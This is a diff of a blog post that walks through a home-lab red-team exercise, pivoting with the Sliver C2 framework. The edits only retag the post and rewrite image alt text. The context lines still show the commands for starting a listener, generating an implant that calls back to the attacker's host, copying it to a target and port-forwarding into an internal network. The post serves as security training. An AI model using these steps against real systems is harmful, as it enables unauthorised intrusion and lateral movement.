@@ -5,7 +5,7 @@ description: >-
 author: r3d0t
 date: 2026-01-26 22:03:00 -0500
 categories: [Red Team, Pivoting with Sliver]
-tags: [red team, c2, hacking, pivoting]
+tags: [red team, sliver c2, c2 framework, pivoting, port forwarding, network penetration, lateral movement]
 pin: false
 media_subpath: ''
 comments: true
@@ -65,7 +65,7 @@ sudo sliver-server
 http --lhost 0.0.0.0 --lport 8888
 ```
 
-![Setting_up.png](/assets/img/posts/sliver-pivoting/Setting_up.png)
+![Sliver C2 framework initial setup](/assets/img/posts/sliver-pivoting/Setting_up.png)
 
 
 Now, we need to generate an implant for Host A to call back to our attacking machine (Kali)
@@ -77,7 +77,7 @@ Now, we need to generate an implant for Host A to call back to our attacking mac
 ```bash
 generate --http 192.168.15.129:8888 --os linux --arch amd64
 ```
-![Implant_generation.png](/assets/img/posts/sliver-pivoting/Implant_generation.png)
+![Generating a Sliver implant for the target](/assets/img/posts/sliver-pivoting/Implant_generation.png)
 
 Our implant is called "TIRED_DYNAMO" and the path is specified.
 
@@ -92,7 +92,7 @@ We can use SSH to Ship our implant to Host A. Conveniently, port 22 is open on H
 sudo scp TIRED_DYNAMO hacker@192.168.15.140:/home/hacker/
 ```
 
-![Transferring_implant.png](/assets/img/posts/sliver-pivoting/Transferring_implant.png)
+![Transferring the Sliver implant to the target host](/assets/img/posts/sliver-pivoting/Transferring_implant.png)
 
 > By "conveniently", I mean we opened it. Install SSH on Host A `sudo apt install ssh`, and start it with `systemctl start ssh`
 {: .prompt-tip}
@@ -103,7 +103,7 @@ From Ubuntu A, we can run our Implant
 ```
 
 As we can see from our server, a call back was established:
-![callback from host A.png](/assets/img/posts/sliver-pivoting/callback%20from%20host%20A.png)
+![Sliver C2 callback received from compromised host A](/assets/img/posts/sliver-pivoting/callback%20from%20host%20A.png)
 
 ### Using the Established connection
 
@@ -111,17 +111,17 @@ Let's check all of our current running sessions
 ```bash
 sessions
 ```
-![Listing_sessions.png](/assets/img/posts/sliver-pivoting/Listing_sessions.png)
+![Listing active Sliver C2 sessions](/assets/img/posts/sliver-pivoting/Listing_sessions.png)
 
 We can see the ID `ce3077ac` which is attributed to the callback from Host A. Let's use that session
 ```bash
 use ce3077ac
 ```
-![Using_sessions.png](/assets/img/posts/sliver-pivoting/Using_sessions.png)
+![Interacting with a Sliver C2 session](/assets/img/posts/sliver-pivoting/Using_sessions.png)
 
 We are now connected to Ubuntu A as the user hacker 
 
-![ifconfig.png](/assets/img/posts/sliver-pivoting/ifconfig.png)
+![Network interfaces on the compromised host showing dual NICs](/assets/img/posts/sliver-pivoting/ifconfig.png)
 
 ## Understanding the Network Topology 
 
@@ -136,10 +136,10 @@ From Ubuntu-A
 curl 10.10.15.131:8080
 ```
 
-![curl_from_ubuntu_A.png](/assets/img/posts/sliver-pivoting/curl_from_ubuntu_A.png)
+![Curl request from Ubuntu-A to Ubuntu-B web server](/assets/img/posts/sliver-pivoting/curl_from_ubuntu_A.png)
 
 Looks like it's working. We can see it here too
-![proof_of_access_from_Ubuntu-A.png](/assets/img/posts/sliver-pivoting/proof_of_access_from_Ubuntu-A.png)
+![Proof of access from Ubuntu-A to internal web server](/assets/img/posts/sliver-pivoting/proof_of_access_from_Ubuntu-A.png)
 
 
 ## Port Forwarding Through Sliver 
@@ -149,17 +149,17 @@ From our sliver session on Host A, we can set up port forwarding so that we can 
 portfwd add --remote 10.10.15.131:8080
 ```
 
-![port_forwarding.png](/assets/img/posts/sliver-pivoting/port_forwarding.png)
+![Sliver C2 portfwd command setting up port forwarding](/assets/img/posts/sliver-pivoting/port_forwarding.png)
 
 So, now we can reach the web server on Host B with 127.0.0.1:8080 from our Kali machine.
 ```bash
 curl 127.0.0.1:8080
 ```
-![accessing_website_from_kali.png](/assets/img/posts/sliver-pivoting/accessing_website_from_kali.png)
+![Accessing internal web server from Kali via Sliver pivot](/assets/img/posts/sliver-pivoting/accessing_website_from_kali.png)
 
 The source Ip will show up as 10.10.15.130 (Host-A) on Host-B, since we are using port forwarding to access the web server via Host-A
 
-![proof_of_access_from_kali.png](/assets/img/posts/sliver-pivoting/proof_of_access_from_kali.png)
+![Proof of access from Kali to internal network via Sliver](/assets/img/posts/sliver-pivoting/proof_of_access_from_kali.png)
 
 That concludes it! This is how we can access a website that is set up on a remote host via port forwarding. 
 
